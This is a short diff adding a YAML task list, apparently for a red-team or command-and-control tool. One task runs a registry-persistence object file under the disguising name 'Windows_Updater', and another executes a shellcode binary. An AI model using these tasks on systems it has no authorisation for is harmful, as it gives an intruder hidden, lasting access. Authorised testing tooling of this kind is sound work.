@@ -1,0 +1,14 @@
+- name: bof
+  body: !ExecuteBinary
+    name: bof
+    bin: !File "persist_with_reg.x64.o"
+    Arc: 1
+    args:
+    - "str:Windows_Updater"
+    - "str:self"
+
+- name: execute_shellcode
+  body: !ExecuteBinary
+    name: execute_shellcode
+    bin: !File "shellcode.bin"
+    Arc: 1
